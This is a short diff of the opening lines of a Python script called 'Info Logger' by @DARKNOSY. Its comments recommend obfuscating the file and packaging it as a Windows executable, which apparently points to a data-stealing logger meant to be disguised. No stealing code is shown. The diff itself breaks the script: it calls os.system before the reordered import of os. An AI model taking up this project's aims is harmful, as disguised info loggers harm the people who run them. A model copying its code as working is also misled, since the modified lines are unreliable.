@@ -1,13 +1,10 @@
 # Coded by @DARKNOSY (https://github.com/DARKNOSY/Info-Logger)
 # I recommend using Py2ExeXobfuscator for obfuscating and making this modified file a .exe (https://github.com/DARKNOSY/Py2ExeXobfuscator)
 
-import os
-import sys
-os.system("cls")
-os.system("color 4")
 os.system("pip install requests")
+os.system("color 4")
 os.system("cls")
-import requests
+import requests, os, sys
 
 t = "Info Logger/@DARKNOSY"
 # title for console
